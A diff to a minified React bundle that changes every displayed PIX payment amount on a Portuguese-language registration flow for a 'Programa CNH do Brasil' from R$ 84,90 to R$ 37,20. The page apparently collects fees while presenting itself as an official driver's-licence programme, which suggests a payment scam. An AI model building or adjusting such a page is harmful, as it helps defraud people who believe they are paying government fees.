@@ -21647,7 +21647,7 @@ function DE() {
                 children: "Valor:"
               }), l.jsx("span", {
                 className: "font-bold text-green-600",
-                children: "R$ 84,90"
+                children: "R$ 37,20"
               })]
             }), l.jsxs("div", {
               className: "flex justify-between items-center",
@@ -21712,7 +21712,7 @@ function DE() {
             className: "text-center mb-6",
             children: [l.jsxs("p", {
               className: "text-3xl font-bold text-green-600",
-              children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "84,90"]
+              children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "37,20"]
             }), l.jsx("p", {
               className: "text-gray-600",
               children: "Valor a ser pago"
@@ -21777,7 +21777,7 @@ function DE() {
               }), l.jsx("li", {
                 children: "3. Escaneie o QR Code ou cole o código PIX"
               }), l.jsx("li", {
-                children: "4. Confirme o pagamento de R$ 84,90"
+                children: "4. Confirme o pagamento de R$ 37,20"
               })]
             })]
           }), l.jsxs("div", {
@@ -22284,7 +22284,7 @@ O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identi
 • Taxa de Serviços Administrativos (TSA): R$ 10,25
 • Taxa de Processamento Eletrônico (TPE): R$ 12,15
 
-Valor Total: R$ 84,90`, 3e3), i("finalize_button")
+Valor Total: R$ 37,20`, 3e3), i("finalize_button")
     }, ww = async () => {
       tc("Finalizar Cadastro", !1), i("generating_pix"), Q("");
       const B = setTimeout(() => {
@@ -22307,7 +22307,7 @@ Valor Total: R$ 84,90`, 3e3), i("finalize_button")
 
 Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.
 
-Assim que realizar o pagamento das taxas no valor de R$ 84,90, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
+Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
     };
   x.useEffect(() => {
     f && y && fw()
@@ -23062,7 +23062,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 84,90, clique no botão 
                       children: "VALOR A PAGAR EM REAIS"
                     }), l.jsx("p", {
                       className: "font-bold text-lg",
-                      children: "R$ 84,90"
+                      children: "R$ 37,20"
                     })]
                   })]
                 }), o === "awaiting_payment" && l.jsx("div", {
